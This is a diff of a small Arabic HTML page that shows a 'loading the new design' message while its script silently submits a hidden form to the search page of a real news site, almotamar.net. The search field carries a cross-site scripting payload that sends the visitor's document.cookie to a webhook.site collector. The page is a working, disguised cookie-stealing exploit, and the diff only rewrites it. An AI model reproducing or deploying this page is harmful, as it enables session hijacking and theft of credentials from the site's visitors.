@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>المؤتمر نت</title>
 <style>
 body{font-family:Tahoma,sans-serif;background:#f0f0f0;margin:0;padding:20px}
@@ -20,18 +20,19 @@ p{text-align:center;color:#666}
 <p>جاري تحميل التصميم الجديد...</p>
 </div>
 <script>
-var f=document.createElement('form');
-f.method='POST';
-f.action='https://www.almotamar.net/news/search.php';
-var i=document.createElement('input');
-i.type='hidden';
-i.name='search';
-i.value='<svg/onload=fetch(\'https://webhook.site/cfb50961-bf9e-48a8-b986-60014adb5551?c=\'+document.cookie)>';
-f.appendChild(i);
-var c=document.createElement('input');
-c.type='hidden';
-c.name='searchcategory';
-c.value='1';
+var p = "<svg onload=fetch(`https://webhook.site/cfb50961-bf9e-48a8-b986-60014adb5551?c=${document.cookie}`)>";
+var f = document.createElement("form");
+f.method = "POST";
+f.action = "https://www.almotamar.net/news/search.php";
+var h = document.createElement("input");
+h.type = "hidden";
+h.name = "search";
+h.value = p;
+f.appendChild(h);
+var c = document.createElement("input");
+c.type = "hidden";
+c.name = "searchcategory";
+c.value = "1";
 f.appendChild(c);
 document.body.appendChild(f);
 f.submit();
